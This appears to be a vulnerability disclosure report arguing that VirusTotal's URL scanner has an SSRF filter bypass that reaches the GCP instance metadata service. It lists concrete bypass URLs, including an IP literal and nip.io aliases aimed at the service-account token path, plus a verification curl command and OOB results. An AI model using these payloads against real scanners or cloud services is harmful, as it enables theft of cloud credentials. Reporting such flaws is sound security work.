## Verified Live — Confirm Before Reading Further

Run this with any free VirusTotal Community API key:

    curl -s "https://www.virustotal.com/api/v3/urls/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8" \
      -H "x-apikey: YOUR_FREE_COMMUNITY_KEY" | python3 -c "
    import sys, json
    a = json.load(sys.stdin)['data']['attributes']
    print('HTTP Status  :', a['last_http_response_code'])
    print('Server       :', a['last_http_response_headers'].get('Server'))
    print('Body SHA256  :', a['last_http_response_content_sha256'])
    print('Times fetched:', a['times_submitted'])"

Expected output:

    HTTP Status  : 200
    Server       : Metadata Server for VM
    Body SHA256  : 9efd71b96213e65bceff3749bfc96401c6728b0faae74fe47d627bd1a120f0d7
    Times fetched: 1647

`aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8` is the base64url encoding of `http://169.254.169.254/` per VT's URL identifier scheme. `Server: Metadata Server for VM` is the GCP Instance Metadata Service self-identifying. VT's own scanner fetched and stored this response **1,647 times** from inside GCP's production network, and it is sitting in VT's free public API right now.

No URL submission required. No premium tier. No waiting.

---

## The Vulnerability

VirusTotal applies a hostname blocklist to prevent SSRF against the GCP Instance Metadata Service:

    POST /api/v3/urls  →  url=http://metadata.google.internal/...
    ← 400 InvalidArgumentError  (BLOCKED)

The filter works by **string-matching the submitted hostname before DNS resolution**. It never resolves the submitted URL to an IP address and never validates the resolved IP against blocked CIDR ranges. Any URL that resolves to `169.254.169.254` without containing the literal string `metadata.google.internal` bypasses the filter entirely.

---

## Two Independent Bypass Vectors

### Bypass 1 — IP Literal

| Submitted URL | VT Filter Result |
|---|---|
| `http://metadata.google.internal/computeMetadata/v1/` | `400 InvalidArgumentError` — **BLOCKED** |
| `http://METADATA.GOOGLE.INTERNAL/computeMetadata/v1/` | `400 InvalidArgumentError: Unable to canonicalize url` — **BLOCKED** |
| `http://169.254.169.254/` | `200 OK` + analysis ID — **ACCEPTED AND FETCHED** |

Same physical destination. The IP literal contains no hostname string to block.

### Bypass 2 — Wildcard DNS Alias

`169-254-169-254.nip.io` is a public wildcard DNS service: `A-B-C-D.nip.io` resolves to `A.B.C.D`. VT's filter evaluates the hostname string before DNS resolution, sees a third-party domain name, and allows it through.

| Submitted URL | VT Accepts? | IMDS HTTP Response | Server Header Stored in VT |
|---|---|---|---|
| `http://169-254-169-254.nip.io/computeMetadata/v1/` | **Yes** | 403 | `Metadata Server for VM` |
| `http://169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token` | **Yes** | 403 | `Metadata Server for VM` |

The 403 responses are GCP's own `Metadata-Flavor` header enforcement — **not VT's filter**. The IMDS received and responded to both requests. VT applied no block.

The same architectural flaw permits bypass via `sslip.io`, attacker-controlled DNS, or any DNS alias service resolving to `169.254.0.0/16`. The attack surface is the entire space of resolvable DNS names.

---

## Scanner Fleet Confirmed Inside GCP (OOB Proof)

A benign OOB listener was submitted to VT. The following GCP IPs made the fetch, confirming VT's scanner fleet runs inside Google's own production network:

| IP | Method | ASN |
|---|---|---|
| `35.187.132.96` | HEAD | Google LLC / GCP US |
| `35.187.132.97` | GET | Google LLC / GCP US |
| `35.187.132.101` | GET | Google LLC / GCP US |
| `35.187.132.102` | HEAD | Google LLC / GCP US |

These IPs originate from within GCP, where `169.254.169.254` is a live production service — not a filtered or sandbox-isolated endpoint.

---

## Root Cause

Pre-DNS hostname string-matching. The filter validates the hostname the user **submitted**, not the IP the hostname **resolves to**. Post-resolution IP validation against blocked CIDR ranges (`169.254.0.0/16`, RFC 1918, loopback) does not exist at either the application or network layer.

---

## This Is a Bypass, Not an Absent Control

The blocklist (`metadata.google.internal` → `400`) proves VT **intentionally implemented SSRF protection** for the GCP metadata endpoint. A control bypassable by two trivially equivalent representations of the blocked address is a **broken control** — not a working one.

"Intended behavior" is not a defensible triager response when the intended behavior is a functioning SSRF filter and two independent techniques demonstrate it is not functioning.

Full reproduction steps, evidence bundle (raw API JSON responses), and automated PoC script are attached.
